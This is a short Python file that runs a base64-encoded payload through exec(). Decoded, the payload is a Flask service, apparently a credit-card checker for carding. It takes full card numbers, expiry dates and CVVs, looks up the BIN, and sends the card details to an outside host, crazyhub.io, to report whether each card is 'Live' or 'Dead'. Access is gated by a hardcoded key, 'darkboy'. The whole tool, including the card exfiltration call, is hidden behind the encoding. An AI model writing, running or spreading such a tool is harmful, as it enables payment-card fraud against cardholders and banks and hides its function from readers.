
import base64
exec(base64.b64decode('ZnJvbSBmbGFzayBpbXBvcnQgRmxhc2ssIHJlcXVlc3QKaW1wb3J0IHJlcXVlc3RzCgphcHAgPSBGbGFzayhfX25hbWVfXykKCmRlZiBnZXRfYmluX2luZm8oYmluX251bWJlcik6CiAgICAjIEZldGNoIEJJTiBpbmZvcm1hdGlvbgogICAgYmluX3VybCA9IGYiaHR0cHM6Ly9iaW5zLmFudGlwdWJsaWMuY2MvYmlucy97YmluX251bWJlcn0iCiAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChiaW5fdXJsKQogICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgIHJldHVybiByZXNwb25zZS5qc29uKCkKICAgIHJldHVybiBOb25lCgpkZWYgc2VuZF9jY190b19jcmF6eWh1YihjY19kZXRhaWxzKToKICAgICMgU2VuZCBDQyBkZXRhaWxzIHRvIGNyYXp5aHViLmlvCiAgICBjY191cmwgPSBmImh0dHBzOi8vY3JhenlodWIuaW8vVlIxLnBocD9jYz17J3wnLmpvaW4oY2NfZGV0YWlscyl9IgogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoY2NfdXJsKQogICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQoKZGVmIGZvcm1hdF9vdXRwdXQoY2NfZGV0YWlscywgYmluX2luZm8sIHN0YXR1cywgcmVzcG9uc2VfbWVzc2FnZSk6CiAgICAjIEZvcm1hdCB0aGUgb3V0cHV0IGJhc2VkIG9uIHRoZSBzdGF0dXMKICAgIGJhbmtfbmFtZSA9IGJpbl9pbmZvLmdldCgnYmFuaycsICdVbmtub3duIEJhbmsnKQogICAgZmxhZyA9IGJpbl9pbmZvLmdldCgnY291bnRyeV9mbGFnJywgJ/CfjI0nKQogICAgb3V0cHV0ID0gZiIiIgrilI/ilIHilIHilIHilIHilIEg772l8J2XpvCdl6fwnZel8J2XnPCdl6PwnZeYIPCdl5TwnZeo8J2Xp/Cdl5vvvaXilIHilIHilIHilIHilIHiipsK4pSDCuKUg+KKmSDwnZeW8J2XlPCdl6XwnZeXIOKeuiB7Y2NfZGV0YWlsc1swXX0K4pSD4oqZIPCdl5jwnZer8J2Xo/Cdl5zwnZel8J2XrCDinroge2NjX2RldGFpbHNbMV19fHtjY19kZXRhaWxzWzJdfQrilIPiipkg8J2XlvCdl6nwnZepIOKeuiB7Y2NfZGV0YWlsc1szXX0K4pSD4oqZIPCdl5XwnZeU8J2XofCdl54g8J2XofCdl5TwnZeg8J2XmCDinroge2JhbmtfbmFtZX17ZmxhZ30K4pSD4oqZIPCdl6XwnZeY8J2XpvCdl6PwnZei8J2XofCdl6bwnZeYIOKeuiB7cmVzcG9uc2VfbWVzc2FnZX0K4pSD4oqZIPCdl6bwnZen8J2XlPCdl6fwnZeo8J2XpiDinrogeyJMaXZlIOKckyIgaWYgc3RhdHVzID09ICJhcHByb3ZlZCIgZWxzZSAiRGVhZCDinJgifQrilIPiipkg8J2Xl/Cdl5jwnZepIOKeuiDwnZeX8J2XlPCdl6XwnZee8J2XlfCdl6LwnZesCuKUgwrilJfilIHilIHilIHilIHilIHvvaXwnZeW8J2Xlu+9peKUgeKUgeKUgeKUgeKUgeKKmwoiIiIKICAgIHJldHVybiBvdXRwdXQKCkBhcHAucm91dGUoJy9rZXk9PGtleT4vY2M9PGNjX2RldGFpbHM+JykKZGVmIHByb2Nlc3NfY2Moa2V5LCBjY19kZXRhaWxzKToKICAgIGlmIGtleSAhPSAiZGFya2JveSI6CiAgICAgICAgcmV0dXJuICJJbnZhbGlkIGtleS4gQWNjZXNzIGRlbmllZC4iCgogICAgIyBFeHRyYWN0IENDIGRldGFpbHMKICAgIGNjX2RldGFpbHMgPSBjY19kZXRhaWxzLnNwbGl0KCd8JykKICAgIGlmIGxlbihjY19kZXRhaWxzKSAhPSA0OgogICAgICAgIHJldHVybiAiSW52YWxpZCBDQyBkZXRhaWxzLiBGb3JtYXQ6IENDfE1NfFlZWVl8Q1ZWIgoKICAgICMgR2V0IEJJTiBpbmZvcm1hdGlvbgogICAgYmluX251bWJlciA9IGNjX2RldGFpbHNbMF1bOjZdCiAgICBiaW5faW5mbyA9IGdldF9iaW5faW5mbyhiaW5fbnVtYmVyKQogICAgaWYgbm90IGJpbl9pbmZvOgogICAgICAgIHJldHVybiAiRmFpbGVkIHRvIHJldHJpZXZlIEJJTiBpbmZvcm1hdGlvbi4iCgogICAgIyBTZW5kIENDIGRldGFpbHMgdG8gY3JhenlodWIuaW8KICAgIHJlc3BvbnNlID0gc2VuZF9jY190b19jcmF6eWh1YihjY19kZXRhaWxzKQoKICAgICMgRGV0ZXJtaW5lIHN0YXR1cyBhbmQgZm9ybWF0IG91dHB1dAogICAgc3RhdHVzID0gImFwcHJvdmVkIiBpZiByZXNwb25zZS5nZXQoInN1Y2Nlc3MiLCBGYWxzZSkgZWxzZSAiZGVjbGluZWQiCiAgICByZXNwb25zZV9tZXNzYWdlID0gcmVzcG9uc2UuZ2V0KCJtZXNzYWdlIiwgIk5vIHJlc3BvbnNlIG1lc3NhZ2UiKQoKICAgIG91dHB1dCA9IGZvcm1hdF9vdXRwdXQoY2NfZGV0YWlscywgYmluX2luZm8sIHN0YXR1cywgcmVzcG9uc2VfbWVzc2FnZSkKICAgIHJldHVybiBmIjxwcmU+e291dHB1dH08L3ByZT4iCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgYXBwLnJ1bihob3N0PScwLjAuMC4wJywgcG9ydD01MDAwKQo=').decode())
